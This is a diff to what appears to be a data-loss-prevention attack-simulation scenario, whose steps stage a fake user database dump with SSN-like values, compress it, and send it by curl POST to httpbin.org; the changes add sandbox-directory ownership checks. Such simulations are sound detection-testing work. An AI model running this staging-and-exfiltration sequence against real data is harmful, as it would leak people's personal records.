@@ -57,7 +57,7 @@ steps:
   - id: "step-01"
     name: "Harvest and stage sensitive database dump"
     command: |
-      mkdir -p /tmp/cortex_dlp_cross
+      rm -rf /tmp/cortex_dlp_cross && mkdir -m 700 /tmp/cortex_dlp_cross || { echo "sandbox /tmp/cortex_dlp_cross could not be created fresh: something else is at that path" >&2; exit 1; }
       cat << 'EOF' > /tmp/cortex_dlp_cross/db_users_dump.sql
       -- DUMP TABLE users
       INSERT INTO users (id, name, email, ssn, pin_hash) VALUES (1, 'Admin User', 'admin@corp.internal', '999-11-2222', 'e80b5017098950fc58aad83c8c14978e');
@@ -76,7 +76,7 @@ steps:
   - id: "step-02"
     name: "Encode and compress staged data payload"
     command: |
-      gzip -c /tmp/cortex_dlp_cross/db_users_dump.sql > /tmp/cortex_dlp_cross/staged_payload.gz
+      [ "$(stat -c %F:%u:%a /tmp/cortex_dlp_cross 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /tmp/cortex_dlp_cross is missing or not ours: step-01 did not complete" >&2; exit 1; }; gzip -c /tmp/cortex_dlp_cross/db_users_dump.sql > /tmp/cortex_dlp_cross/staged_payload.gz
     identity: "svc-backup"
     mitre_technique: "T1560.001"
     causality:
@@ -92,6 +92,7 @@ steps:
   - id: "step-03"
     name: "Exfiltrate staged payload over high-volume network stream"
     command: |
+      [ "$(stat -c %F:%u:%a /tmp/cortex_dlp_cross 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /tmp/cortex_dlp_cross is missing or not ours: step-01 did not complete" >&2; exit 1; }
       curl -sk -X POST --data-binary "@/tmp/cortex_dlp_cross/staged_payload.gz" \
         -H "Content-Type: application/octet-stream" \
         https://httpbin.org/post || true
